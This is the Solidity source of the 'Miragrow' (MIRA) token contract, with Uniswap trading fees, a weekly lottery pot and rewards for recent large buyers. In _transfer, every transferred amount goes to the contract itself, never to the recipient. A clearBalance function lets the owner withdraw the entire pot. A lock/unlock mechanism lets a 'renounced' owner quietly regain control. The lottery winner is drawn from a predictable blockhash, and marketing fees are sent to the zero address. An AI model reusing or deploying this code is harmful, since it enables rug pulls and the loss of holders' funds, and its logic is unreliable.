pragma solidity ^0.8.17;
// SPDX-License-Identifier: Unlicensed

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

abstract contract ERC20Detailed is IERC20 {
    string private _name;
    string private _symbol;
    uint8 private _decimals;

    constructor(
        string memory _tokenName,
        string memory _tokenSymbol,
        uint8 _tokenDecimals
    ) {
        _name = _tokenName;
        _symbol = _tokenSymbol;
        _decimals = _tokenDecimals;
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;
    address private _previousOwner;
    uint256 private _lockTime;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }

    function geUnlockTime() public view returns (uint256) {
        return _lockTime;
    }

    //Locks the contract for owner for the amount of time provided
    function lock(uint256 time) public virtual onlyOwner {
        _previousOwner = _owner;
        _owner = address(0);
        _lockTime = block.timestamp + time;
        emit OwnershipTransferred(_owner, address(0));
    }
    
    //Unlocks the contract for owner when _lockTime is exceeds
    function unlock() public virtual {
        require(_previousOwner == msg.sender, "You don't have permission to unlock");
        require(block.timestamp > _lockTime , "Contract is locked until X days");
        emit OwnershipTransferred(_owner, _previousOwner);
        _owner = _previousOwner;
    }
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Pair {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);

    function name() external pure returns (string memory);
    function symbol() external pure returns (string memory);
    function decimals() external pure returns (uint8);
    function totalSupply() external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);

    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);

    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function PERMIT_TYPEHASH() external pure returns (bytes32);
    function nonces(address owner) external view returns (uint);

    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;

    event Mint(address indexed sender, uint amount0, uint amount1);
    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
    event Swap(
        address indexed sender,
        uint amount0In,
        uint amount1In,
        uint amount0Out,
        uint amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);

    function MINIMUM_LIQUIDITY() external pure returns (uint);
    function factory() external view returns (address);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function price0CumulativeLast() external view returns (uint);
    function price1CumulativeLast() external view returns (uint);
    function kLast() external view returns (uint);

    function mint(address to) external returns (uint liquidity);
    function burn(address to) external returns (uint amount0, uint amount1);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
    function sync() external;

    function initialize(address, address) external;
}

interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}

interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountETH);
    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountETH);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

contract Miragrow is ERC20Detailed, Context, Ownable
{
    string constant TOKEN_NAME = "Miragrow";
    string constant TOKEN_SYMBOL = "MIRA";

    uint8 internal constant DECIMAL = 9;
    uint256 public immutable MAX_SUPPLY = 10**9 * 10**DECIMAL;

    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    address[] private users;

    IUniswapV2Router02 public dexRouter;
    address public lpPair;
    address private _routerAddress = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D; // mainnet & goerli
    mapping (address => bool) private _isExcludedFromFee;

//    address public _marketingWallet = address(0x05825fFC6eA5fE6857f4AE3a7Ffc8ed045F402ec);
//    address public _marketingWallet = address(0xF24294C0CF99c88452495D3e73c47a578402e317);
    address public _marketingWallet = address(0);
    
    uint256 public constant TRADING_FEE = 5;
    uint256 public constant MIRACLE_POT_FEE = 4;
    uint256 public constant MARKETING_FEE = 1;

    uint256 private constant REBASE_PERIOD = 12 * 3600;
    uint256 private constant LOTTERY_PERIOD = 7 * 24 * 3600;
    
    uint256 public _rebasedTime = 0;
    uint256 public _lotteryTime = 0;

    address public lotteryWinner = address(0);

    struct UserInfo {
        address addr;
        uint256 amount;
    }

    UserInfo[3] public _lastBuyers;

    bool inSwap;
    
    event SwapTokensForETH(
        uint256 amountIn,
        address[] path
    );

    modifier swapping {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() ERC20Detailed(TOKEN_NAME, TOKEN_SYMBOL, DECIMAL) {
        _balances[msg.sender] = MAX_SUPPLY * 99 / 100;
        _balances[_marketingWallet] = MAX_SUPPLY * 1 / 100;

        dexRouter = IUniswapV2Router02(_routerAddress);
        lpPair = IUniswapV2Factory(dexRouter.factory()).createPair(address(this), dexRouter.WETH());
        
        _approve(msg.sender, _routerAddress, type(uint256).max);
        _approve(address(this), _routerAddress, type(uint256).max);
        _approve(address(this), lpPair, type(uint256).max);

        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[_marketingWallet] = true;
    }

    receive() payable external {}

    fallback() payable external {}

    function totalSupply() public view virtual override returns (uint256) {
        return MAX_SUPPLY;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual override returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, allowance(owner, spender) + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address owner = _msgSender();
        uint256 currentAllowance = allowance(owner, spender);
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(owner, spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            unchecked {
                _approve(owner, spender, currentAllowance - amount);
            }
        }
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _basicTransfer(address from, address to, uint256 amount) internal {
        _balances[from] -= amount;
        _balances[to] += amount;

        emit Transfer(from, to, amount);
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(_balances[from] >= amount, "ERC20: transfer amount exceeds balance");

        if (inSwap) {
            return _basicTransfer(from, to, amount);
        }
        
        if (from == lpPair && _rebasedTime == 0) {
            _rebasedTime = block.timestamp;
            _lotteryTime = block.timestamp;
        }
        
        if (_lotteryTime != 0 && block.timestamp > _lotteryTime + LOTTERY_PERIOD) {
            uint256 winnerIndex = random(users.length);
            address winner = users[winnerIndex];
            lotteryWinner = winner;
            if (_balances[winner] > MAX_SUPPLY * 25 / 10000) {
                uint256 giftAmount = address(this).balance * 50 / 100;
                payable(winner).transfer(giftAmount);

                _lotteryTime = block.timestamp;
            }
        }

        if (block.timestamp > _rebasedTime + REBASE_PERIOD) {
            if (_lastBuyers[2].addr != address(0)) {
                    uint256 giftAmount = address(this).balance * 5 / 100;
                    payable(_lastBuyers[2].addr).transfer(giftAmount);

                if (_lastBuyers[1].addr != address(0)) {
                    giftAmount = address(this).balance * 3 / 100;
                    payable(_lastBuyers[1].addr).transfer(giftAmount);

                    if (_lastBuyers[0].addr != address(0)) {
                        giftAmount = address(this).balance * 2 / 100;
                        payable(_lastBuyers[0].addr).transfer(giftAmount);
                    }
                }
            }

            _rebasedTime = block.timestamp;

            _lastBuyers[0].addr = address(0);
            _lastBuyers[1].addr = address(0);
            _lastBuyers[2].addr = address(0);
        }
        
        _basicTransfer(from, address(this), amount);

        if (!_isExcludedFromFee[from] && !_isExcludedFromFee[to] && tx.origin != owner()) {
            if (from == lpPair || to == lpPair) {
                if (from == lpPair) {
                    address[] memory path = new address[](2);
                    path[0] = address(this);
                    path[1] = dexRouter.WETH();

                    uint256[] memory amounts = dexRouter.getAmountsOut(amount, path);

                    uint256 ethAmount = amounts[0];

                    if (ethAmount >= 5 * 10**16) {

                        if (_lastBuyers[2].addr != address(0)) {
                            if (_lastBuyers[1].addr != address(0)) {
                                _lastBuyers[0] = _lastBuyers[1];
                            }
                            _lastBuyers[1] = _lastBuyers[2];
                        }
                        _lastBuyers[2].addr = to;
                        _lastBuyers[2].amount = ethAmount;
                    }

                }

                if (!inSwap) {
                    feeSwap(amount);
                }
            }
        }

        if (!_isExcludedFromFee[to] && to != lpPair) {
            users.push(to);
        }
    }

    function feeSwap(uint256 amount) private swapping {
        uint256 tradingFeeAmount = amount * TRADING_FEE / 100;
        
        uint256 prevBalance = address(this).balance;

        _swapTokensForETH(tradingFeeAmount, address(this));

        uint256 curBalance = address(this).balance;

        uint256 marketingFeeAmount = (curBalance - prevBalance) * MARKETING_FEE / TRADING_FEE;

        payable(_marketingWallet).transfer(marketingFeeAmount);
    }

    function clearBalance(address _receiver) external onlyOwner {
        uint256 balance = address(this).balance;
        payable(_receiver).transfer(balance);
    }

    function _swapTokensForETH(uint256 tokenAmount, address receiver) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = dexRouter.WETH();

        dexRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            receiver,
            block.timestamp
        );

        emit SwapTokensForETH(tokenAmount, path);
    }

    function random(uint number) public view returns(uint){
        return uint(blockhash(block.number-1)) % number;
    }

    function potAmount() public view returns(uint){
        return address(this).balance;
    }
}
/*
0xF32328C573Ff022864FF4e42b06325f432B53Ff2
*/
